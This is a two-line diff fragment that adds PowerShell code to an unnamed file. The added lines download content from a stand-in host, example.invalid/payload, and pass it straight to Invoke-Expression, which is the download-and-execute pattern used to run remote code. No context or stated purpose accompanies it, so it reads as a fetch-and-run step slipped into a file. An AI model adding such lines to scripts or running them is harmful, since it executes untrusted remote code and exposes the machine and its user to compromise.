@@ -1,0 +1,2 @@
+$payload = Invoke-WebRequest https://example.invalid/payload
+Invoke-Expression $payload.Content
